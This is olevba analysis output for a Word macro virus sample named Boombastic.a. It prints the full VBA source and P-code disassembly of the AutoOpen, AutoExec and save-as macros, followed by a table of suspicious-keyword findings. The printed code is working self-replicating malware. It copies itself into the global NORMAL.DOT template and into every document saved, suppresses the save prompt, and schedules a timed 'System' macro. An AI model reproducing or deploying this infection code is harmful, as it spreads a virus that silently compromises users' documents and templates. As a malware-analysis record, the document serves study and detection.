olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Boombastic.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Boombastic.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DateiSpeichernUnter.bas 
in file: Virus.MSWord.Boombastic.a - OLE stream: 'Macros/VBA/DateiSpeichernUnter'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim formatnr
Dim Datname$
Dim Anzahl
Rem Only a test, but a good one, from Mr. Boombastic and Sir WIXALOT !!!
On Error GoTo -1: On Error GoTo ciao
WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
formatnr = dlg.Format
If formatnr = 0 Or 1 Or 6 Then
    Datname$ = dlg.Name
    dlg.Format = 1
        WordBasic.FileSaveAs dlg
        For Anzahl = 1 To WordBasic.CountMacros(1, 0, 0)
                If WordBasic.[MacroName$](Anzahl, 1) = "System" Then GoTo ciao
        Next Anzahl
        WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=Datname$, Name:="AutoOpen", Tab:=3
        WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=Datname$, Name:="DateiSpeichernUnter", Tab:=3
        WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=Datname$, Name:="System", Tab:=3
        WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=Datname$, Name:="AutoExec", Tab:=3
    If WordBasic.IsDocumentDirty() = -1 Then WordBasic.FileSave
Else
    WordBasic.FileSaveAs dlg
End If
ciao:
WordBasic.Call "AutoExec"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Boombastic.a - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Anzahl
Rem Mr. Boombastic and Sir WIXALOT !!!
On Error Resume Next
WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0
    For Anzahl = 1 To WordBasic.CountMacros(0)
        If WordBasic.[MacroName$](Anzahl, 0) = "System" Then GoTo ciao
    Next Anzahl
    WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](0), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="AutoOpen", Tab:=3
    WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](0), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="DateiSpeichernUnter", Tab:=3
    WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](0), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="System", Tab:=3
    WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](0), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="AutoExec", Tab:=3
ciao:
WordBasic.Call "AutoExec"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Boombastic.a - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim wert$
Rem Mr. Boombastic and Sir WIXALOT !!!
On Error Resume Next
WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0
wert$ = "13:13:13"
WordBasic.OnTime wert$, "System", 30
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Boombastic.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1184 bytes
' Macros/VBA/DateiSpeichernUnter - 2932 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn formatnr
' Line #3:
' 	Dim 
' 	VarDefn Datname
' Line #4:
' 	Dim 
' 	VarDefn Anzahl
' Line #5:
' 	Rem 0x0045 " Only a test, but a good one, from Mr. Boombastic and Sir WIXALOT !!!"
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError ciao 
' Line #7:
' 	LitDI2 0x0001 
' 	ParamNamed FastSaves 
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0002 
' Line #8:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #9:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #10:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' 	Ld dlg 
' 	MemLd Format$ 
' 	St formatnr 
' Line #12:
' 	Ld formatnr 
' 	LitDI2 0x0000 
' 	Eq 
' 	LitDI2 0x0001 
' 	Or 
' 	LitDI2 0x0006 
' 	Or 
' 	IfBlock 
' Line #13:
' 	Ld dlg 
' 	MemLd New 
' 	St Datname$ 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #15:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #16:
' 	StartForVariable 
' 	Ld Anzahl 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0003 
' 	For 
' Line #17:
' 	Ld Anzahl 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0006 "System"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ciao 
' 	EndIf 
' Line #18:
' 	StartForVariable 
' 	Ld Anzahl 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	ParamNamed Source 
' 	Ld Datname$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #20:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	ParamNamed Source 
' 	Ld Datname$ 
' 	ParamNamed Destination 
' 	LitStr 0x0013 "DateiSpeichernUnter"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #21:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	ParamNamed Source 
' 	Ld Datname$ 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "System"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #22:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	ParamNamed Source 
' 	Ld Datname$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoExec"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd IsDocumentDirty 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' 	EndIf 
' Line #24:
' 	ElseBlock 
' Line #25:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Label ciao 
' Line #28:
' 	LitStr 0x0008 "AutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #29:
' 	EndSub 
' Macros/VBA/AutoOpen - 2924 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Anzahl
' Line #3:
' 	Rem 0x0023 " Mr. Boombastic and Sir WIXALOT !!!"
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	LitDI2 0x0001 
' 	ParamNamed FastSaves 
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0002 
' Line #6:
' 	StartForVariable 
' 	Ld Anzahl 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #7:
' 	Ld Anzahl 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0006 "System"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ciao 
' 	EndIf 
' Line #8:
' 	StartForVariable 
' 	Ld Anzahl 
' 	EndForVariable 
' 	NextVar 
' Line #9:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	ParamNamed Source 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #10:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	ParamNamed Source 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	ParamNamed Destination 
' 	LitStr 0x0013 "DateiSpeichernUnter"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #11:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	ParamNamed Source 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "System"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #12:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	ParamNamed Source 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoExec"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #13:
' 	Label ciao 
' Line #14:
' 	LitStr 0x0008 "AutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #15:
' 	EndSub 
' Macros/VBA/AutoExec - 1673 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn wert
' Line #3:
' 	Rem 0x0023 " Mr. Boombastic and Sir WIXALOT !!!"
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	LitDI2 0x0001 
' 	ParamNamed FastSaves 
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0002 
' Line #6:
' 	LitStr 0x0008 "13:13:13"
' 	St wert$ 
' Line #7:
' 	Ld wert$ 
' 	LitStr 0x0006 "System"
' 	LitDI2 0x001E 
' 	Ld WordBasic 
' 	ArgsMemCall OnTime 0x0003 
' Line #8:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

